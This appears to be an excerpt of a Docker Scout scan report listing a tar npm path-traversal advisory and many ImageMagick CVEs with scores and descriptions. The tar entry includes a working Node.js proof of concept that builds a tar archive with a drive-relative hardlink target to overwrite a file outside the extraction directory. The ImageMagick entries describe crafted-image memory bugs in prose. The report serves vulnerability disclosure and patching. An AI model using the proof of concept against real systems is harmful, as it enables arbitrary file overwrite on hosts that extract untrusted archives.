<small><code>pkg:npm/tar@7.5.9</code></small><br/>
<a href="https://scout.docker.com/v/GHSA-qffp-2rhf-9h96?s=github&n=tar&t=npm&vr=%3C%3D7.5.9"><img alt="high 8.2: GHSA--qffp--2rhf--9h96" src="https://img.shields.io/badge/GHSA--qffp--2rhf--9h96-lightgrey?label=high%208.2&labelColor=e25d68"/></a> <i>Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')</i>

<table>
<tr><td>Affected range</td><td><code><=7.5.9</code></td></tr>
<tr><td>Fixed version</td><td><code>7.5.10</code></td></tr>
<tr><td>CVSS Score</td><td><code>8.2</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:L/SC:N/SI:H/SA:L</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

### Summary
`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details
The extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.

What happens with `linkpath: "C:../target.txt"`:
1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.
2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.
3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.
4. Writing through the extracted hardlink overwrites the outside file.

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC
Tested on Arch Linux with `tar@7.5.9`.

PoC script (`poc.cjs`):

```js
const fs = require('fs')
const path = require('path')
const { Header, x } = require('tar')

const cwd = process.cwd()
const target = path.resolve(cwd, '..', 'target.txt')
const tarFile = path.join(process.cwd(), 'poc.tar')

fs.writeFileSync(target, 'ORIGINAL\n')

const b = Buffer.alloc(1536)
new Header({ path: 'l', type: 'Link', linkpath: 'C:../target.txt' }).encode(b, 0)
fs.writeFileSync(tarFile, b)

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'l'), 'PWNED\n')
  process.stdout.write(fs.readFileSync(target, 'utf8'))
})
```

Run:

```bash
cd test-workspace
node poc.cjs && ls -l ../target.txt
```

Observed output:

```text
PWNED
-rw-r--r-- 2 joshuavr joshuavr 6 Mar  4 19:25 ../target.txt
```

`PWNED` confirms outside file content overwrite. Link count `2` confirms the extracted file and `../target.txt` are hardlinked.

### Impact
This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:
- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 27" src="https://img.shields.io/badge/M-27-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>imagemagick</strong> <code>8:6.9.12.98+dfsg1-5.2build2</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/imagemagick@8%3A6.9.12.98%2Bdfsg1-5.2build2?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2026-25986?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 9.8: CVE--2026--25986" src="https://img.shields.io/badge/CVE--2026--25986-lightgrey?label=medium%209.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.056%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 7.1.2-15 and 6.9.13-40, a heap buffer overflow write vulnerability exists in ReadYUVImage() (coders/yuv.c) when processing malicious YUV 4:2:2 (NoInterlace) images. The pixel-pair loop writes one pixel beyond the allocated row buffer. Versions 7.1.2-15 and 6.9.13-40 contain a patch.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-25983?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 9.8: CVE--2026--25983" src="https://img.shields.io/badge/CVE--2026--25983-lightgrey?label=medium%209.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.072%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 7.1.2-15 and 6.9.13-40, a crafted MSL script triggers a heap-use-after-free. The operation element handler replaces and frees the image while the parser continues reading from it, leading to a UAF in ReadBlobString during further parsing. Versions 7.1.2-15 and 6.9.13-40 contain a patch.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-25968?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 9.8: CVE--2026--25968" src="https://img.shields.io/badge/CVE--2026--25968-lightgrey?label=medium%209.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.056%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 7.1.2-15 and 6.9.13-40, a stack buffer overflow occurs when processing the an attribute in msl.c. A long value overflows a fixed-size stack buffer, leading to memory corruption. Versions 7.1.2-15 and 6.9.13-40 contain a patch.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-25897?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 9.8: CVE--2026--25897" src="https://img.shields.io/badge/CVE--2026--25897-lightgrey?label=medium%209.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.056%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 7.1.2-15 and 6.9.13-40, an Integer Overflow vulnerability exists in the sun decoder. On 32-bit systems/builds, a carefully crafted image can lead to an out of bounds heap write. Versions 7.1.2-15 and 6.9.13-40 contain a patch.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-23876?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 9.8: CVE--2026--23876" src="https://img.shields.io/badge/CVE--2026--23876-lightgrey?label=medium%209.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.084%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>25th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 7.1.2-13 and 6.9.13-38, a heap buffer overflow vulnerability in the XBM image decoder (ReadXBMImage) allows an attacker to write controlled data past the allocated heap buffer when processing a maliciously crafted image file. Any operation that reads or identifies an image can trigger the overflow, making it exploitable via common image upload and processing pipelines. Versions 7.1.2-13 and 6.9.13-38 fix the issue.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-57807?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 9.8: CVE--2025--57807" src="https://img.shields.io/badge/CVE--2025--57807-lightgrey?label=medium%209.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.042%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. ImageMagick versions lower than 14.8.2 include insecure functions: SeekBlob(), which permits advancing the stream offset beyond the current end without increasing capacity, and WriteBlob(), which then expands by quantum + length (amortized) instead of offset + length, and copies to data + offset. When offset ≫ extent, the copy targets memory beyond the allocation, producing a deterministic heap write on 64-bit builds. No 2⁶⁴ arithmetic wrap, external delegates, or policy settings are required. This is fixed in version 14.8.2.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-53101?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 9.8: CVE--2025--53101" src="https://img.shields.io/badge/CVE--2025--53101-lightgrey?label=medium%209.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.069%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. In versions prior to 7.1.2-0 and 6.9.13-26, in ImageMagick's `magick mogrify` command, specifying multiple consecutive `%d` format specifiers in a filename template causes internal pointer arithmetic to generate an address below the beginning of the stack buffer, resulting in a stack overflow through `vsnprintf()`. Versions 7.1.2-0 and 6.9.13-26 fix the issue.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-53014?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 9.8: CVE--2025--53014" src="https://img.shields.io/badge/CVE--2025--53014-lightgrey?label=medium%209.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.031%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Versions prior to 7.1.2-0 and 6.9.13-26 have a heap buffer overflow in the `InterpretImageFilename` function. The issue stems from an off-by-one error that causes out-of-bounds memory access when processing format strings containing consecutive percent signs (`%%`). Versions 7.1.2-0 and 6.9.13-26 fix the issue.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-26284?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 9.1: CVE--2026--26284" src="https://img.shields.io/badge/CVE--2026--26284-lightgrey?label=medium%209.1&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.056%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 7.1.2-15 and 6.9.13-40, ImageMagick lacks proper boundary checking when processing Huffman-coded data from PCD (Photo CD) files. The decoder contains an function that has an incorrect initialization that could cause an out of bounds read. Versions 7.1.2-15 and 6.9.13-40 contain a patch.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-25987?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 9.1: CVE--2026--25987" src="https://img.shields.io/badge/CVE--2026--25987-lightgrey?label=medium%209.1&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 7.1.2-15 and 6.9.13-40, a heap buffer over-read vulnerability exists in the MAP image decoder when processing crafted MAP files, potentially leading to crashes or unintended memory disclosure during image decoding. Versions 7.1.2-15 and 6.9.13-40 contain a patch.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-25898?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 9.1: CVE--2026--25898" src="https://img.shields.io/badge/CVE--2026--25898-lightgrey?label=medium%209.1&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.054%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 7.1.2-15 and 6.9.13-40, the UIL and XPM image encoder do not validate the pixel index value returned by `GetPixelIndex()` before using it as an array subscript. In HDRI builds, `Quantum` is a floating-point type, so pixel index values can be negative. An attacker can craft an image with negative pixel index values to trigger a global buffer overflow read during conversion, leading to information disclosure or a process crash. Versions 7.1.2-15 and 6.9.13-40 contain a patch.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-57803?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 8.8: CVE--2025--57803" src="https://img.shields.io/badge/CVE--2025--57803-lightgrey?label=medium%208.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.075%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>23rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 6.9.13-28 and 7.1.2-2 for ImageMagick's 32-bit build, a 32-bit integer overflow in the BMP encoder’s scanline-stride computation collapses bytes_per_line (stride) to a tiny value while the per-row writer still emits 3 × width bytes for 24-bpp images. The row base pointer advances using the (overflowed) stride, so the first row immediately writes past its slot and into adjacent heap memory with attacker-controlled bytes. This is a classic, powerful primitive for heap corruption in common auto-convert pipelines. This issue has been patched in versions 6.9.13-28 and 7.1.2-2.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-55298?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 8.8: CVE--2025--55298" src="https://img.shields.io/badge/CVE--2025--55298-lightgrey?label=medium%208.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.430%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>62nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to ImageMagick versions 6.9.13-28 and 7.1.2-2, a format string bug vulnerability exists in InterpretImageFilename function where user input is directly passed to FormatLocaleString without proper sanitization. An attacker can overwrite arbitrary memory regions, enabling a wide range of attacks from heap overflow to remote code execution. This issue has been patched in versions 6.9.13-28 and 7.1.2-2.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-55154?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.8: CVE--2025--55154" src="https://img.shields.io/badge/CVE--2025--55154-lightgrey?label=medium%207.8&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.047%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>14th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 6.9.13-27 and 7.1.2-1, the magnified size calculations in ReadOneMNGIMage (in coders/png.c) are unsafe and can overflow, leading to memory corruption. This issue has been patched in versions 6.9.13-27 and 7.1.2-1.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-26066?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.5: CVE--2026--26066" src="https://img.shields.io/badge/CVE--2026--26066-lightgrey?label=medium%207.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.039%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 7.1.2-15 and 6.9.13-40, a crafted profile contain invalid IPTC data may cause an infinite loop when writing it with `IPTCTEXT`. Versions 7.1.2-15 and 6.9.13-40 contain a patch.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-25796?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.5: CVE--2026--25796" src="https://img.shields.io/badge/CVE--2026--25796-lightgrey?label=medium%207.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.055%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 7.1.2-15 and 6.9.13-40, in `ReadSTEGANOImage()` (`coders/stegano.c`), the `watermark` Image object is not freed on three early-return paths, resulting in a definite memory leak (~13.5KB+ per invocation) that can be exploited for denial of service. Versions 7.1.2-15 and 6.9.13-40 contain a patch.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2026-25795?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.5: CVE--2026--25795" src="https://img.shields.io/badge/CVE--2026--25795-lightgrey?label=medium%207.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.056%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 7.1.2-15 and 6.9.13-40, in `ReadSFWImage()` (`coders/sfw.c`), when temporary file creation fails, `read_info` is destroyed before its `filename` member is accessed, causing a NULL pointer dereference and crash. Versions 7.1.2-15 and 6.9.13-40 contain a patch.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69204?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.5: CVE--2025--69204" src="https://img.shields.io/badge/CVE--2025--69204-lightgrey?label=medium%207.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.098%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to version 7.1.2-12, in the WriteSVGImage function, using an int variable to store number_attributes caused an integer overflow. This, in turn, triggered a buffer overflow and caused a DoS attack. Version 7.1.2-12 fixes the issue.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-68618?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.5: CVE--2025--68618" src="https://img.shields.io/badge/CVE--2025--68618-lightgrey?label=medium%207.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.096%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>27th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to version 7.1.2-12, using Magick to read a malicious SVG file resulted in a DoS attack. Version 7.1.2-12 fixes the issue.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-62171?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.5: CVE--2025--62171" src="https://img.shields.io/badge/CVE--2025--62171-lightgrey?label=medium%207.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.123%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is an open source software suite for displaying, converting, and editing raster image files. In ImageMagick versions prior to 7.1.2-7 and 6.9.13-32, an integer overflow vulnerability exists in the BMP decoder on 32-bit systems. The vulnerability occurs in coders/bmp.c when calculating the extent value by multiplying image columns by bits per pixel. On 32-bit systems with size_t of 4 bytes, a malicious BMP file with specific dimensions can cause this multiplication to overflow and wrap to zero. The overflow check added to address CVE-2025-57803 is placed after the overflow occurs, making it ineffective. A specially crafted 58-byte BMP file with width set to 536,870,912 and 32 bits per pixel can trigger this overflow, causing the bytes_per_line calculation to become zero. This vulnerability only affects 32-bit builds of ImageMagick where default resource limits for width, height, and area have been manually increased beyond their defaults. 64-bit systems with size_t of 8 bytes are not vulnerable, and systems using default ImageMagick resource limits are not vulnerable. The vulnerability is fixed in versions 7.1.2-7 and 6.9.13-32.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-55212?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.5: CVE--2025--55212" src="https://img.shields.io/badge/CVE--2025--55212-lightgrey?label=medium%207.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.260%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>49th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. Prior to versions 6.9.13-28 and 7.1.2-2, passing a geometry string containing only a colon (":") to montage -geometry leads GetGeometry() to set width/height to 0. Later, ThumbnailImage() divides by these zero dimensions, triggering a crash (SIGFPE/abort), resulting in a denial of service. This issue has been patched in versions 6.9.13-28 and 7.1.2-2.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-53019?s=ubuntu&n=imagemagick&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 7.5: CVE--2025--53019" src="https://img.shields.io/badge/CVE--2025--53019-lightgrey?label=medium%207.5&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.058%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>18th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

ImageMagick is free and open-source software used for editing and manipulating digital images. In versions prior to 7.1.2-0 and 6.9.13-26, in ImageMagick's `magick stream` command, specifying multiple consecutive `%d` format specifiers in a filename template causes a memory leak. Versions 7.1.2-0 and 6.9.13-26 fix the issue.

</blockquote>
</details>

